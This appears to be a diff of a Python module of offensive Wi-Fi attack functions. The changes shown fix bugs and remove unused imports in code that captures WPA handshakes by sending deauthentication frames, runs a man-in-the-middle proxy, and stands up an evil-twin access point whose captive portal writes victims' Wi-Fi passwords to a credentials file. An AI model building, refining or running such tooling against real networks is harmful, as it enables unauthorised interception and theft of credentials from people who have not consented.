@@ -8,14 +8,13 @@ For connecting: nmcli (NetworkManager) or wpa_supplicant.
 import datetime
 import html
 import json
-import os
 import re
 import subprocess
 import tempfile
 import time
 from pathlib import Path
 from shutil import which
-from typing import Dict, List, Optional
+from typing import Optional
 logger = logging.getLogger(__name__)
 
 
@@ -213,14 +212,14 @@ def wifi_handshake_capture(bssid: str, channel: str, iface: str = "wlan0",
         return {"error": "No capture tool (install bettercap or aircrack-ng)"}
     prefix = str(Path(tmpdir) / "hs")
     airo_cmd = [airodump, "-c", channel, "-w", prefix, "--bssid", bssid, iface]
-    proc = subprocess.Popen(airodump_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    proc = subprocess.Popen(airo_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     time.sleep(3)
     if aireplay:
         subprocess.run(
             [aireplay, "-0", "3", "-a", bssid, iface],
             timeout=15, capture_output=True,
         )
-    time.sleep(timeout - 18)
+    time.sleep(max(0, timeout - 18))
     proc.terminate()
     proc.wait()
     for ext in (".cap", ".pcap"):
@@ -283,7 +282,7 @@ def wifi_connect(ssid: str, password: str = "", iface: str = "wlan0",
         conf_path.write_text(conf)
         # Kill existing wpa_supplicant on this iface
         _run(["pkill", "-f", f"wpa_supplicant.*{iface}"], timeout=5)
-        wpa_proc = subprocess.Popen(
+        subprocess.Popen(
             [wpa, "-B", "-i", iface, "-c", str(conf_path)],
             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
         )
@@ -535,8 +534,6 @@ def wpa_sycophant_relay(iface: str = "wlan0", target_bssid: str = "",
 def mitmproxy_intercept(port: int = 8080, listen_addr: str = "0.0.0.0",
                         mode: str = "transparent", timeout: int = 120) -> dict:
     """Start mitmproxy in transparent or regular proxy mode."""
-    tools_dir = Path("/share/tools")
-    mitm_dir = tools_dir / "mitmproxy"
     mitm_bin = _check_tool("mitmproxy") or _check_tool("mitmdump") or _check_tool("mitmweb")
     if not mitm_bin:
         return {"error": "mitmproxy not found (pip install mitmproxy or check /share/tools/mitmproxy)"}
@@ -577,7 +574,6 @@ def evil_twin_full(essid: str, iface: str = "wlan0", channel: str = "6",
     4. Start mitmproxy/BetterCAP proxy to capture credentials
     """
     results = {}
-    import shutil
     import tempfile
 
     # 1. Start rogue AP
@@ -659,7 +655,8 @@ def evil_twin_full(essid: str, iface: str = "wlan0", channel: str = "6",
                 captured_pw = params.get("password", [""])[0]
                 captured_ssid = params.get("ssid", [essid])[0]
                 # Log captured credentials
-                log_entry = f"[{datetime.datetime.now(datetime.timezone.utc).isoformat().replace("+00:00", "Z")}] SSID: {captured_ssid}  PASSWORD: {captured_pw}\n"
+                ts = datetime.datetime.now(datetime.timezone.utc).isoformat().replace("+00:00", "Z")
+                log_entry = f"[{ts}] SSID: {captured_ssid}  PASSWORD: {captured_pw}\n"
                 log_path = Path(portal_path) / "captured_creds.txt"
                 with open(str(log_path), "a") as lf:
                     lf.write(log_entry)
